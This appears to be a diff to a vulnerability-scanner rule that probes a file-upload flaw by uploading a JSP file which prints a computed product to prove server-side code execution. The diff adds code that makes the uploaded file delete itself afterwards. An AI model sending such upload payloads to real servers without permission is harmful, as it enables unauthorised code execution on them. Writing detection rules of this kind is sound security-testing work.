@@ -12,7 +12,7 @@ rules:
       ------WebKitFormBoundaryFy3iNVBftjP6IOwo
       Content-Disposition: form-data; name="file"; filename="{{r1}}.jsp"
       Content-Type: application/octet-stream
-      <%out.print({{r2}} * {{r3}});%>
+      <%out.print({{r2}} * {{r3}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
       ------WebKitFormBoundaryFy3iNVBftjP6IOwo--
     expression: response.status == 200
   - method: GET
